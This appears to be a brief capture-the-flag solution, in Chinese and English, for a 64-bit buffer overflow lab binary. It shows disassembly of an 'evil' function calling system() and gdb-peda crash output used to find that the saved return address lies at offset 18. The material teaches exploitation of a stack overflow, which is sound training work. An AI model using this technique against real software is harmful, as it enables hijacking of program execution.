# 解答

```shell
yuan@yuan-All-Series:~/ctf/ns107/jmp$ objdump -d bof

0000000000400677 <evil>:
  400677:	55                   	push   %rbp
  400678:	48 89 e5             	mov    %rsp,%rbp
  40067b:	48 8d 3d 36 01 00 00 	lea    0x136(%rip),%rdi        # 4007b8 <_IO_stdin_used+0x8>
  400682:	e8 e9 fe ff ff       	callq  400570 <system@plt>
  400687:	90                   	nop
  400688:	5d                   	pop    %rbp
  400689:	c3                   	retq   

```
```shell
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7af4154 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7dd18c0 --> 0x0 
RSI: 0x7ffff7dd07e3 --> 0xdd18c0000000000a 
RDI: 0x1 
RBP: 0x41416e4141244141 ('AA$AAnAA')
RSP: 0x7fffffffdf68 ("CAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RIP: 0x400721 (<main+151>:	ret)
R8 : 0x64 ('d')
R9 : 0x7ffff7fe24c0 (0x00007ffff7fe24c0)
R10: 0x3 
R11: 0x246 
R12: 0x400590 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe040 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400716 <main+140>:	call   0x400550 <puts@plt>
   0x40071b <main+145>:	mov    eax,0x0
   0x400720 <main+150>:	leave  
=> 0x400721 <main+151>:	ret    
   0x400722:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x40072c:	nop    DWORD PTR [rax+0x0]
   0x400730 <__libc_csu_init>:	push   r15
   0x400732 <__libc_csu_init+2>:	push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf68 ("CAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0x7fffffffdf70 ("ADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0x7fffffffdf78 ("AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0x7fffffffdf80 ("0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0032| 0x7fffffffdf88 ("A1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0040| 0x7fffffffdf90 ("AA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0048| 0x7fffffffdf98 ("dAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0056| 0x7fffffffdfa0 ("AeAA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400721 in main ()

gdb-peda$ info frame
Stack level 0, frame at 0x7fffffffdf68:
 rip = 0x400721 in main; saved rip = 0x412841412d414143
 called by frame at 0x7fffffffdf78
 Arglist at 0x41416e4141244141, args: 
 Locals at 0x41416e4141244141, Previous frame's sp is 0x7fffffffdf70
 Saved registers:
  rip at 0x7fffffffdf68
  
gdb-peda$ pattern offset 0x412841412d414143
4695074359721673027 found at offset: 18
```

pattern create 100 = pattc 100